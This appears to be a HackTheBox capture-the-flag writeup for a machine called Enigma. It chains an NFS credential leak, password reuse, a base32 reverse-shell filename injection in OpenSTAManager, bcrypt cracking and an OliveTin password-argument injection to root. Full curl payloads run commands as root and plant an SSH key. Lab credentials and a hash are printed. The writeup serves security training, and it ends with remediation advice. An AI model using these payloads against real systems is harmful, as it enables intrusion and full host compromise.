---
title: "Enigma: HackTheBox Penetration Test Writeup"
date: 2026-11-09
categories: [Writeups, HackTheBox]
tags: [htb, linux, nfs, roundcube, openstamanager, cve-2025-69212, olivetin, cve-2026-27626, command-injection, password-reuse, hash-cracking, ssh-tunneling, grpc, privesc]
description: "A black-box HackTheBox Enigma writeup covering NFS credential leak, mail enumeration, authenticated OS command injection in OpenSTAManager (CVE-2025-69212), MySQL hash cracking, and OliveTin password-type argument shell injection (CVE-2026-27626) for root."
pin: false
toc: true
---

> **Authorized Lab Disclosure & Spoiler Warning**
> This post documents exploitation of a HackTheBox machine in an authorized, controlled lab environment. All techniques described here were performed solely within HackTheBox's platform. If you intend to attempt this machine yourself, be aware that **this writeup contains full spoilers**. Flags are redacted but the complete attack path is described. Proceed at your own discretion.

---

## Executive Summary

Enigma is a Linux machine on HackTheBox that chains together credential leaks, password reuse across multiple services, an authenticated command injection in OpenSTAManager, database hash cracking, and a shell safety check bypass in OliveTin to achieve full root compromise.

The attack surface is broad: NFS, IMAP/POP3, three web virtual hosts (corporate site, Roundcube webmail, OpenSTAManager), and an internal OliveTin automation panel running as root.

| Property | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux (Ubuntu) |
| User flag | [REDACTED] |
| Root flag | [REDACTED] |
| Initial foothold | Authenticated RCE via CVE-2025-69212 (OpenSTAManager 2.9.8) |
| Lateral movement | MySQL credential extraction and bcrypt hash cracking |
| Privilege escalation | OliveTin password-type argument injection (CVE-2026-27626) |

---

## Reconnaissance

### Port Scan

A full TCP port scan was performed with host-discovery disabled, as the target did not respond to ICMP:

```bash
nmap -p- -Pn --min-rate=1000 -T4 10.129.199.167
```

Followed by version and script detection on discovered ports:

```bash
nmap -p22,80,110,111,143,993,995,2049 -sV -sC -Pn 10.129.199.167
```

| Port | Service | Notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH, publickey-only authentication |
| 80/tcp | HTTP | nginx, corporate landing page |
| 110/tcp | POP3 | Dovecot |
| 111/tcp | rpcbind | NFS related |
| 143/tcp | IMAP | Dovecot |
| 993/tcp | IMAPS | Dovecot (SSL) |
| 995/tcp | POP3S | Dovecot (SSL) |
| 2049/tcp | NFS | Network File System |

Internal services discovered later via `ss -tlnp` from within the target:

| Port | Service |
|---|---|
| 1337 | OliveTin (localhost only) |
| 3306 | MySQL |
| 25 | SMTP (Postfix) |

### Virtual Host Enumeration

The HTTP service on port 80 served a corporate site for `enigma.htb`. Virtual host fuzzing discovered two additional hosts:

```bash
gobuster vhost -u http://enigma.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

| Hostname | Application |
|---|---|
| `enigma.htb` | Corporate landing page |
| `mail001.enigma.htb` | Roundcube webmail (v1.6.16, fully patched) |
| `support_001.enigma.htb` | OpenSTAManager v2.9.8 |

All three were added to `/etc/hosts`.

---

## Finding 1: NFS Credential Leak

### Description

The NFS service exported a world-readable onboarding share.

### Exploitation

The available NFS exports were listed:

```bash
showmount -e 10.129.199.167
```

Output:

```text
/srv/nfs/onboarding *
```

The share was mounted and its contents examined:

```bash
mkdir /tmp/nfs
mount -t nfs 10.129.199.167:/srv/nfs/onboarding /tmp/nfs
ls /tmp/nfs
```

The share contained an onboarding PDF document with plaintext webmail credentials:

| Field | Value |
|---|---|
| Username | `kevin` |
| Password | `Enigma2024!` |
| Service | Roundcube webmail at `mail001.enigma.htb` |

### Impact

An unauthenticated attacker with network access to the NFS port could recover valid credentials without any exploitation.

---

## Finding 2: Password Reuse and Mail-Based Credential Chain

### Description

The `kevin` account's password was reused by another user, `sarah`, whose mailbox contained administrative credentials for OpenSTAManager.

### Exploitation

Kevin's credentials were validated on Roundcube and via IMAP. His mailbox contained only a welcome email from `sarah@enigma.htb` with no further leads.

The same password was tested against Sarah's account:

```bash
curl -k imaps://10.129.199.167 -u 'sarah:Enigma2024!'
```

Authentication succeeded. Sarah's mailbox contained an email from IT with OpenSTAManager credentials:

| Field | Value |
|---|---|
| URL | `http://support_001.enigma.htb` |
| Username | `admin` |
| Password | `Ne3s4rtars78s` |

### Impact

Password reuse across two user accounts exposed an administrative credential chain, giving an attacker access to the internal support ticketing system.

---

## Finding 3: Authenticated RCE in OpenSTAManager (CVE-2025-69212)

**CVE:** CVE-2025-69212
**Affected version:** OpenSTAManager 2.9.8

### Description

OpenSTAManager 2.9.8 was vulnerable to authenticated OS command injection through the electronic invoicing (P7M) file import functionality. When processing uploaded ZIP archives, the application passed filenames to `openssl` without sanitization, allowing command substitution via `$(...)` in the filename.

### Exploitation

A listener was started:

```bash
nc -lvnp 4444
```

A malicious ZIP file was crafted with a filename containing a reverse shell payload encoded in base32 to avoid special character issues in the filesystem:

```bash
# The filename contains a $(...) command substitution that decodes
# and executes a reverse shell payload via base32
zip evil.zip 'z$(echo${IFS}<BASE32_PAYLOAD>|base32${IFS}-d|bash).p7m'
```

The ZIP was uploaded through the OpenSTAManager interface:

1. Log in as `admin` at `http://support_001.enigma.htb`
2. Navigate to the electronic invoicing module
3. Upload the malicious ZIP via `POST /actions.php` with `op=save`, `id_module=15`, `id_plugin=19`
4. Trigger processing by clicking the import button in the Electronic Invoicing tab

The listener received a callback:

```text
www-data@enigma:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Impact

Authenticated command injection provided remote code execution as the `www-data` service account.

---

## Finding 4: Database Credential Exposure and Hash Cracking

### Description

The OpenSTAManager configuration file contained plaintext database credentials. The database stored a bcrypt hash for user `haris` that was crackable with a common wordlist.

### Exploitation

The OpenSTAManager database configuration was found at:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

Relevant values:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

The user table was queried:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager \
  -e "SELECT * FROM zz_users;"
```

Two accounts were found:

| Username | Email | Hash |
|---|---|---|
| admin | admin@enigma.htb | `$2y$10$rTJVU...` (bcrypt) |
| haris | haris@enigma.htb | `$2y$10$WHf1T...` (bcrypt) |

The `haris` hash was cracked with John the Ripper:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
john --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
```

Result:

```text
bestfriends      (?)
```

The cracked password was used to switch to the `haris` user:

```bash
su - haris
```

The user flag was then readable:

```bash
cat ~/user.txt
```

### Impact

Plaintext database credentials in a web application configuration file, combined with a weak user password, enabled lateral movement from a web service account to an interactive system user.

---

## Finding 5: OliveTin Password-Type Argument Injection (CVE-2026-27626)

**CVE:** CVE-2026-27626
**Affected version:** OliveTin 3000.10.0

### Description

OliveTin is a web-based automation tool that lets administrators define shell commands with user-supplied arguments. A shell safety check (`checkShellArgumentSafety`) blocks dangerous characters for most argument types, but the `password` type is not included in the blocklist. An attacker can inject shell metacharacters through a password-typed argument, and those characters are passed directly to `sh -c` without sanitization.

On this target, OliveTin was running as **root** on `127.0.0.1:1337` with guest authentication disabled (`authRequireGuestsToLogin: false`), meaning no login was required.

### Enumeration

The OliveTin process was discovered during enumeration as `www-data`:

```bash
ps aux | grep -i olive
```

```text
root  1524  /usr/local/bin/OliveTin
```

The configuration was readable at `/etc/OliveTin/config.yaml` and contained a "Backup Database" action:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password        # <-- not blocked by safety check
    - name: db_name
      type: ascii_identifier
```

The `db_pass` argument uses the `password` type, which the CVE identifies as the type that bypasses shell safety checks.

The OliveTin version was confirmed:

```bash
/usr/local/bin/OliveTin -version
```

```text
version="3000.10.0"
```

### Accessing OliveTin

OliveTin was bound to `127.0.0.1:1337` and not reachable externally. An SSH tunnel was established to forward the port to the attacker machine.

First, an SSH public key was added to the `haris` account on the target:

```bash
mkdir -p /home/haris/.ssh
echo "<ATTACKER_PUBLIC_KEY>" > /home/haris/.ssh/authorized_keys
chmod 700 /home/haris/.ssh
chmod 600 /home/haris/.ssh/authorized_keys
```

Then the tunnel was created from the attacker:

```bash
ssh -i ./haris_key -L 1337:127.0.0.1:1337 haris@10.129.201.14
```

With the tunnel active, `http://127.0.0.1:1337/` in the attacker's browser loaded the OliveTin web UI.

### API Discovery

The OliveTin web UI was used with browser developer tools to capture the actual API request format. Clicking the Backup Database action and inspecting the network request revealed:

- **Endpoint:** `POST /api/olivetin.api.v1.OliveTinApiService/StartAction`
- **Content-Type:** `application/json`
- **Required header:** `connect-protocol-version: 1`
- **Key field name:** `bindingId` (not `actionId` as the CVE's PoC suggested)

This was a Connect-RPC (gRPC) protocol, not a standard REST API.

### Exploitation

A proof-of-concept injection was sent to verify root command execution. The injected `db_pass` value breaks out of the single-quoted context in the shell command template:

The original shell command template:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

With the injected value `x' ; id > /tmp/pwned.txt ; echo '`, the command becomes:

```bash
mysqldump -u brollin -p'x' ; id > /tmp/pwned.txt ; echo '' openstamanager > /opt/backups/backup.sql
```

The semicolons split this into three separate commands, and `id > /tmp/pwned.txt` executes as root.

The curl command:

```bash
curl -X POST http://localhost:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -H "connect-protocol-version: 1" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"brollin"},{"name":"db_pass","value":"x'\'' ; id > /tmp/pwned.txt ; echo '\''"},{"name":"db_name","value":"openstamanager"}],"uniqueTrackingId":"aaaa-bbbb-cccc"}'
```

Verification:

```bash
cat /tmp/pwned.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root command execution was confirmed. The same technique was used to inject an SSH public key into root's `authorized_keys`:

```bash
curl -X POST http://localhost:1337/api/olivetin.api.v1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -H "connect-protocol-version: 1" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"brollin"},{"name":"db_pass","value":"x'\'' ; mkdir -p /root/.ssh && echo <ATTACKER_PUBLIC_KEY> >> /root/.ssh/authorized_keys ; echo '\''"},{"name":"db_name","value":"openstamanager"}],"uniqueTrackingId":"aaaa-bbbb-eeee"}'
```

A root SSH session was then established:

```bash
ssh -i ./haris_key root@10.129.201.14
```

```text
root@enigma:~# id
uid=0(root) gid=0(root) groups=0(root)
root@enigma:~# cat root.txt
[REDACTED]
```

### Impact

The OliveTin shell safety check bypass allowed any user with access to the web UI (unauthenticated in this configuration) to execute arbitrary commands as root on the host.

---

## Attack Chain Summary

```text
[Unauthenticated attacker]
        |
        | NFS share: world-readable onboarding PDF
        v
[kevin webmail credentials]
        |
        | Password reuse: sarah uses same password
        v
[sarah mailbox: OpenSTAManager admin creds]
        |
        | CVE-2025-69212: P7M filename command injection
        v
[www-data shell on Enigma]
        |
        | DB config file + MySQL hash cracking
        v
[haris user shell / user flag]
        |
        | SSH tunnel to OliveTin on localhost:1337
        | CVE-2026-27626: password-type argument injection
        v
[Root shell / root flag]
```

---

## Recommendations

### Immediate

- Restrict NFS exports to authorized hosts and remove sensitive documents from shared directories.
- Upgrade OpenSTAManager to a version that patches CVE-2025-69212.
- Upgrade OliveTin to a version that patches CVE-2026-27626.
- Enable authentication on OliveTin (`authRequireGuestsToLogin: true`).
- Rotate all credentials exposed during the assessment.

### Short-Term

- Enforce unique passwords across all user accounts and services.
- Remove plaintext database credentials from web application configuration files; use a secrets management solution.
- Require strong, unique passwords for all database and application accounts; enforce password complexity policies.
- Bind internal services to localhost only where possible and use firewall rules to restrict access.

### Longer-Term

- Implement centralized credential management and auditing.
- Conduct periodic internal vulnerability scanning.
- Review all shell-executing automation tools for input sanitization gaps.
- Implement network segmentation to limit lateral movement paths.

---

_This writeup documents an authorized HackTheBox lab engagement only._
